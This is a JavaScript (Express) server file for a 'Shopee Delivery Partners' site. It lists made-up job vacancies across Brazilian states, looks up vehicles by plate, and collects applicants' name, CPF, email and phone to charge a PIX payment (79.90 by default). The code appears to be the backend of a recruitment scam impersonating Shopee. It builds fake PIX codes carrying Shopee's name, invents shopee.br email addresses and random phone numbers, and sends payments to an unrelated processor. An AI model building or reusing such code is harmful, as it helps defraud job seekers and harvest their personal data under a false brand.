// Servidor Full-Stack para Heroku - API + Frontend
import express from 'express';
import cors from 'cors';
import compression from 'compression';
import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PORT = process.env.PORT || 5000;

console.log('='.repeat(50));
console.log('SHOPEE DELIVERY PARTNERS - FULL STACK SERVER');
console.log('='.repeat(50));
console.log(`Node Version: ${process.version}`);
console.log(`PORT: ${PORT}`);
console.log(`NODE_ENV: ${process.env.NODE_ENV || 'not set'}`);
console.log(`__dirname: ${__dirname}`);
console.log('='.repeat(50));

const app = express();

// Middlewares
app.use(cors());
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Log de requisições
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Mock data - Todas as regiões do Brasil
const mockRegions = [
  { name: "Acre", abbr: "AC", vacancies: 4 },
  { name: "Alagoas", abbr: "AL", vacancies: 5 },
  { name: "Amapá", abbr: "AP", vacancies: 3 },
  { name: "Amazonas", abbr: "AM", vacancies: 7 },
  { name: "Bahia", abbr: "BA", vacancies: 10 },
  { name: "Ceará", abbr: "CE", vacancies: 8 },
  { name: "Distrito Federal", abbr: "DF", vacancies: 12 },
  { name: "Espírito Santo", abbr: "ES", vacancies: 6 },
  { name: "Goiás", abbr: "GO", vacancies: 9 },
  { name: "Maranhão", abbr: "MA", vacancies: 5 },
  { name: "Mato Grosso", abbr: "MT", vacancies: 6 },
  { name: "Mato Grosso do Sul", abbr: "MS", vacancies: 5 },
  { name: "Minas Gerais", abbr: "MG", vacancies: 14 },
  { name: "Pará", abbr: "PA", vacancies: 7 },
  { name: "Paraíba", abbr: "PB", vacancies: 5 },
  { name: "Paraná", abbr: "PR", vacancies: 11 },
  { name: "Pernambuco", abbr: "PE", vacancies: 9 },
  { name: "Piauí", abbr: "PI", vacancies: 4 },
  { name: "Rio de Janeiro", abbr: "RJ", vacancies: 18 },
  { name: "Rio Grande do Norte", abbr: "RN", vacancies: 5 },
  { name: "Rio Grande do Sul", abbr: "RS", vacancies: 12 },
  { name: "Rondônia", abbr: "RO", vacancies: 22 },
  { name: "Roraima", abbr: "RR", vacancies: 3 },
  { name: "Santa Catarina", abbr: "SC", vacancies: 10 },
  { name: "São Paulo", abbr: "SP", vacancies: 26 },
  { name: "Sergipe", abbr: "SE", vacancies: 4 },
  { name: "Tocantins", abbr: "TO", vacancies: 4 }
];

// ========== ROTAS DA API ==========

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'production',
    port: PORT,
    uptime: process.uptime()
  });
});

// Regiões
app.get('/api/regions', (req, res) => {
  console.log('Regions requested');
  res.json(mockRegions);
});

// Criar pagamento PIX
app.post('/api/payments/create-pix', (req, res) => {
  const { name, cpf, email, phone, amount } = req.body;
  
  console.log('Payment request:', { name, cpf: cpf?.substring(0, 3) + '***', amount });
  
  if (!name || !cpf || !amount) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAOPAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
  
  res.json({
    id: paymentId,
    pixCode: pixCode,
    pixQrCode: pixQrCode,
    status: 'pending'
  });
});

// Cache para consultas de veículos
const vehicleInfoCache = {};

// Consultar informações do veículo pela placa
app.get('/api/vehicle-info/:placa', async (req, res) => {
  try {
    const { placa } = req.params;
    
    if (!placa) {
      return res.status(400).json({ error: 'Placa do veículo não fornecida' });
    }
    
    // Limpar a placa e deixar apenas letras e números
    const vehiclePlate = placa.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
    
    // Verificar se a informação já está em cache
    if (vehicleInfoCache[vehiclePlate]) {
      console.log(`[CACHE] Usando dados em cache para placa: ${vehiclePlate}`);
      return res.json(vehicleInfoCache[vehiclePlate]);
    }
    
    console.log(`[INFO] Consultando informações do veículo com placa: ${vehiclePlate}`);
    
    // Verificar se existe a chave da API de veículos
    if (!process.env.VEHICLE_API_KEY) {
      console.error('[ERRO] Chave da API de consulta de veículos não configurada');
      console.error('[DEBUG] Variáveis disponíveis:', Object.keys(process.env).filter(k => !k.includes('SECRET') && !k.includes('KEY')));
      return res.status(500).json({ 
        error: 'Configuração incorreta',
        details: 'Serviço de consulta de veículos não configurado. VEHICLE_API_KEY ausente.',
        timestamp: new Date().toISOString()
      });
    }

    const apiKey = process.env.VEHICLE_API_KEY;
    const keyPreview = apiKey.substring(0, 5) + '...' + apiKey.substring(apiKey.length - 3);
    console.log(`[DEBUG] API key presente: ${keyPreview}`);
    
    // URL da API de consulta de veículos
    const apiUrl = `https://wdapi2.com.br/consulta/${vehiclePlate}/${apiKey}`;
    
    console.log('[DEBUG] Tentando consulta direta com chave na URL');
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json'
      }
    });
    
    if (!response.ok) {
      const status = response.status;
      console.log('[AVISO] Consulta de veículo falhou:', status);
      return res.status(500).json({ 
        error: 'Falha ao consultar dados do veículo',
        details: `API retornou status ${status}`,
        timestamp: new Date().toISOString()
      });
    }
    
    const vehicleData = await response.json();
    console.log('[INFO] Consulta de veículo bem-sucedida');
    
    // Se a API retornou erro
    if (vehicleData.error) {
      console.log(`[INFO] Erro na consulta da placa ${vehiclePlate}: ${vehicleData.error}`);
      return res.status(404).json({ 
        error: vehicleData.error,
        placa: vehiclePlate,
        message: 'A API de veículos retornou um erro para esta placa.',
        timestamp: new Date().toISOString()
      });
    }
    
    // Armazenar em cache
    vehicleInfoCache[vehiclePlate] = vehicleData;
    console.log(`[CACHE] Armazenando dados da placa ${vehiclePlate} em cache`);
    
    res.json(vehicleData);
    
  } catch (error) {
    console.error('[ERRO] Falha na consulta de veículo:', error.message);
    res.status(500).json({ 
      error: 'Erro ao consultar informações do veículo',
      details: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Criar pagamento PIX via 4m Pagamentos
app.post('/api/payments/pix', async (req, res) => {
  try {
    const { name, cpf, email, phone, amount, description } = req.body;
    
    console.log('[PAYMENT] Recebida requisição de pagamento PIX:', {
      name,
      cpf: cpf?.substring(0, 3) + '***',
      amount
    });
    
    // Validação básica
    if (!name || !cpf) {
      return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
    }
    
    // Verificar se a API 4m Pagamentos está configurada
    if (!process.env.FOUR_M_PAGAMENTOS_API_KEY) {
      console.error('[PAYMENT] FOUR_M_PAGAMENTOS_API_KEY não configurada');
      return res.status(500).json({
        error: 'Serviço de pagamento não configurado. Configure a chave de API 4m Pagamentos.',
      });
    }
    
    // Formatar CPF (remover caracteres não numéricos)
    const cleanCpf = cpf.replace(/\D/g, '');
    
    // Formatar telefone (remover caracteres não numéricos)
    const cleanPhone = phone ? phone.replace(/\D/g, '') : `11${Math.floor(Math.random() * 1000000000).toString().padStart(9, '0')}`;
    
    // Usar valor fornecido ou padrão
    const paymentAmount = amount || 79.90;
    
    // Usar email fornecido ou gerar um
    const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
    
    // Formatar amount como string com 2 casas decimais
    const formattedAmount = typeof paymentAmount === 'number' 
      ? paymentAmount.toFixed(2) 
      : parseFloat(paymentAmount).toFixed(2);
    
    // Preparar dados para a API 4m Pagamentos
    const paymentData = {
      amount: formattedAmount,
      customer_name: name,
      customer_email: userEmail,
      customer_cpf: cleanCpf,
      customer_phone: cleanPhone,
      description: description || 'Pagamento via PIX'
    };
    
    console.log('[PAYMENT] Enviando dados para 4m Pagamentos API');
    
    // Chamar API 4m Pagamentos
    const apiResponse = await fetch('https://app.4mpagamentos.com/api/v1/payments', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${process.env.FOUR_M_PAGAMENTOS_API_KEY}`,
        'Accept': 'application/json'
      },
      body: JSON.stringify(paymentData)
    });
    
    if (!apiResponse.ok) {
      const errorData = await apiResponse.json().catch(() => ({}));
      console.error('[PAYMENT] Erro da API 4m Pagamentos:', errorData);
      return res.status(apiResponse.status).json({
        error: errorData.error || 'Erro ao processar pagamento',
        details: errorData
      });
    }
    
    const apiResult = await apiResponse.json();
    console.log('[PAYMENT] Pagamento criado com sucesso');
    
    // A API retorna { success: true, data: {...} }
    const transaction = apiResult.data || apiResult;
    
    // Verificar se os campos necessários estão presentes
    if (!transaction.pix_code || !transaction.pix_qr_code) {
      throw new Error('Resposta da API não contém os dados PIX necessários');
    }
    
    // Retornar resposta formatada
    const result = {
      id: transaction.id.toString(),
      transactionId: transaction.transaction_id,
      pixCode: transaction.pix_code,
      pixQrCode: transaction.pix_qr_code,
      amount: transaction.amount,
      status: transaction.status || 'pending',
      expiresAt: transaction.expires_at || null,
      createdAt: transaction.created_at
    };
    
    res.status(200).json(result);
    
  } catch (error) {
    console.error('[PAYMENT] Erro ao processar pagamento:', error.message);
    res.status(500).json({ 
      error: error.message || 'Falha ao processar pagamento.'
    });
  }
});

// Verificar status de pagamento (endpoint público da 4m Pagamentos)
app.get('/api/payments/status/:transactionId', async (req, res) => {
  try {
    const { transactionId } = req.params;
    
    if (!transactionId) {
      return res.status(400).json({ error: 'ID da transação não fornecido' });
    }
    
    console.log(`[PAYMENT] Verificando status da transação: ${transactionId}`);
    
    // Endpoint público - não requer autenticação
    const response = await fetch(
      `https://app.4mpagamentos.com/api/v1/transactions/${transactionId}`,
      {
        method: 'GET',
        headers: {
          'Accept': 'application/json'
        }
      }
    );
    
    if (!response.ok) {
      return res.status(response.status).json({
        error: 'Erro ao verificar status do pagamento'
      });
    }
    
    const statusData = await response.json();
    
    res.status(200).json({
      id: statusData.id,
      transactionId: statusData.transactionId,
      status: statusData.status,
      amount: statusData.amount,
      createdAt: statusData.createdAt,
      paidAt: statusData.paidAt
    });
    
  } catch (error) {
    console.error('[PAYMENT] Erro ao verificar status:', error.message);
    res.status(500).json({ 
      error: error.message || 'Erro ao verificar status do pagamento'
    });
  }
});

// Catch-all para APIs não encontradas
app.use('/api/*', (req, res) => {
  res.status(404).json({
    error: 'API endpoint not found',
    path: req.originalUrl
  });
});

// ========== SERVIR FRONTEND ==========

// Verificar onde está o frontend compilado
const possiblePaths = [
  path.join(__dirname, 'dist', 'public'),
  path.join(__dirname, 'dist'),
  path.join(__dirname, 'public'),
  path.join(__dirname, 'build')
];

let frontendPath = null;
for (const p of possiblePaths) {
  if (fs.existsSync(p)) {
    const indexPath = path.join(p, 'index.html');
    if (fs.existsSync(indexPath)) {
      frontendPath = p;
      console.log(`✓ Frontend encontrado em: ${frontendPath}`);
      break;
    }
  }
}

if (frontendPath) {
  // Servir arquivos estáticos
  app.use(express.static(frontendPath));
  
  // SPA fallback - todas as rotas não-API servem o index.html
  app.get('*', (req, res) => {
    res.sendFile(path.join(frontendPath, 'index.html'));
  });
  
  console.log('✓ Frontend configurado - servindo SPA');
} else {
  console.warn('⚠️  Frontend não encontrado. Servindo apenas API.');
  
  // Fallback se não houver frontend
  app.get('*', (req, res) => {
    res.json({
      message: 'Shopee Delivery Partners API',
      version: '1.0.0',
      status: 'online',
      note: 'Frontend será servido quando disponível',
      endpoints: {
        health: '/health',
        regions: '/api/regions',
        payments: '/api/payments/create-pix'
      }
    });
  });
}

// Error handler
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({
    error: 'Internal server error',
    message: err.message
  });
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('='.repeat(50));
  console.log('✅ SERVER STARTED SUCCESSFULLY');
  console.log(`🌐 Listening on port ${PORT}`);
  console.log(`📁 Frontend: ${frontendPath || 'Not found'}`);
  console.log(`🔗 http://0.0.0.0:${PORT}`);
  console.log('='.repeat(50));
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});
